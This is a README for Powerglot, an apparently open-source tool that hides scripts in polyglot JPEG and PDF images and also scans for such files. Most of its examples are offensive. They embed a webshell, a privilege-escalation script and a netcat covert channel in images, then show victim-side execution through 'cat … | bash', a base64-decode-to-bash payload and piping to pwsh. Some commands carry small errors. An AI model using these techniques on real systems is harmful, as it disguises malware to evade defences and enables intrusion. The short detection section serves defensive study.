# Powerglot

Powerglot encodes several kind of scripts using polyglots, for example, offensive powershell scripts. It is not needed a loader to run the payload.

In red-team exercises or offensive tasks, masking of payloads is usually done by using steganography, especially to avoid network level protections, being one of the most common payloads scripts developed in powershell. Recent malware and APTs make use of some of these capabilities: APT32, APT37, Ursnif, Powload, LightNeuron/Turla, Platinum APT, Waterbug/Turla, Lokibot, The dukes (operation Ghost), Titanium, etc.

Powerglot is a multifunctional and multi-platform attack and defense tool based on polyglots. Powerglot allows to mask a script (powershell, shellscripting, php, ...) mainly in a digital image, although other file formats are in progress. Unlike the usual offensive tools or malware, Powerglot does not need any loader to execute the "information hidden", minimizing the noise on the target system.

PowerGlot has a clear utility in offensive tasks but it is also defined as a discovery and blue team tool. To our knowledge, it is the first general and complete open-source tool that allows to search for the presence of masked information with polyglots, information that could be useful to achieve persistence in a system or to hide malware (stego-malware, privilege escalation, lateral movement, reverse shell, etc.)

Features:
- Encode powershell/shell script/php/.. in a polyglot image. It is not necessary a loader to recover/execute the hidden information (payload). PowerGlot works with several formats. Mainly, JPEG and PDF format. Other formats are in progress.

- Powerglot is a complete open-source tool to detect (malicious) polyglots, specially the result of some public tools as Truepolyglot or stegoSploit. We works in several formats: JPEG, PNG, GIF, BMP, ZIP, PDF, MP3, etc.

# Installation
```
# git clone https://github.com/mindcrypt/powerglot
# python3 powerglot
```
# Usage & Parameters

Some examples to hide payloads using polyglots with Powerglot
```
# Example 1 - Hiding a powershell/php/shell script in a JPEG image

# python3 powerglot.py -o payload.ps1 cat.jpg cat-hidden1.jpg
# python3 powerglot.py -o webshell.php cat.jpg cat-hidden2.jpg
# python3 powerglot.py -o shell.sh cat.jpg cat-hidden3.jpg
```
```
# Example 2 - Hiding a shell script (linenum.sh) for privilege escalation "hidden" in a JPEG image

# python3 powerglot.py -o linenum.sh cat.jpg cat-linenum.jpg
# file cat-linenum.jpg (It is a valid JPEG file)
# feh cat-lineum.jpg (The image is properly showed in an image viewer)

# We can execute the script in several ways:

a) cat cat-linenum | bash
b) chmod +x cat-linenum.jpeg; ./cat-linenum.jpeg

```
```
# Example 3 - Hiding a cover-channel wiht netcat in a JPEG image

# Attacker
# echo "nc 127.0.0.1 4444" > netcat.sh
# python3 powerglot.py -o netcat.sh cat.jpeg cat-netcat.jpeg
# nc -nvlp 4444

#Victim
# chmod +x cat-netcat.jpg | ./cat-netcat.jpg

![alt text](https://github.com/mindcrypt/powerglot/blob/master/nc-polyglot.png)
```
```
# Example 4 - Polyglot in PDF (Ej-linenum.sh)
# Create b64.sh with your favourite payload
base64 Linenum.sh -w 0 > b64.sh
# Edit b64.sh
echo "code in b64.sh" | base64 -d | bash;

# python3 powerglot -o b64.sh sample.pdf test.pdf
# file test.pdf
# xpdf test.pdf

# Execute payload
# cat test.pdf | bash or chmod +x test.pdf; ./test.pdf
```
```
# Example 5 - Powershell in JPEG (polyglot)
# python3 powerglot.py -o script.ps1 cat.jpeg cat-ps.jpeg
# file cat-ps.jpeg
# feh cat-ps.jpeg

# Execute payload (example)
# cat cat-ps.jpeg | pwsh

PS /home/alfonso/PowerGlot/POWERSHELL> get-process;<#hola <# mundo#>

 NPM(K)    PM(M)      WS(M)     CPU(s)      Id  SI ProcessName
 ------    -----      -----     ------      --  -- -----------
      0     0,00       2,70       0,00     830 829 (sd-pam)
      0     0,00       0,00       0,00      75   0 acpi_thermal_pm
      0     0,00       4,80       0,00    1217 854 agent
      0     0,00       1,70       0,00     748 748 agetty
      0     0,00      40,77       1,01    1198 854 applet.py
      0     0,00       6,29       0,00     938 938 at-spi-bus-launcher
      0     0,00       6,61       5,64     953 938 at-spi2-registryd
      0     0,00       0,00       0,00     131   0 ata_sff
      0     0,00       1,77       0,00    8906 …78 atom
      0     0,00     218,81     585,95    8908 …78 atom
      0     0,00     236,18     176,24    8947 …78 atom
      0     0,00     142,14       2,51    9009 …78 atom
      0     0,00      81,54       3,32    8932 …78 atom --type=gpu-process --enable-features=SharedArrayBuffer -…
      0     0,00      39,44       0,01    8910 …78 atom --type=zygote --no-sandbox
      0     0,00       5,62       0,11    1370 …70 bash
      0     0,00       5,36       0,66    5278 …78 bash
      0     0,00       6,34       1,48    6778 …78 bash
      0     0,00       0,00       0,00      68   0 blkcg_punt_bio
      0     0,00      46,73       2,20    1199 854 blueman-applet
      0     0,00      50,25       1,64    1301 854 blueman-tray
```
Some examples to detect polyglots in our filesystem
```
#python3 powerglot.py -d ./
--= [Detecting polyglots] --=
..............................................................
[Suspicious file]-[ ./cat-end-extra2.jpg ]..
[Suspicious file]-[ ./cat-end-extra3.jpg ][Polyglot Stegosploit][EOF Signature: */ -->]
.................................................................................
[Suspicious file]-[ ./cat-end-extra1.jpg ]..
```

# Future work. Doing
- We are working to support different file formats for encoding information in polyglots. Currently, we support several techniques in JPEG and PDF.
- We are working to incorporate rules for the detection of polyglots in different formats. Currently, the presence of StegoSploit in JPEG files is detected (added */ --> after FFD9)

# Author & license

This project has been developed by Dr. Alfonso Muñoz and Abraham Pasamar. The code is released under the GNU General Public License v3.


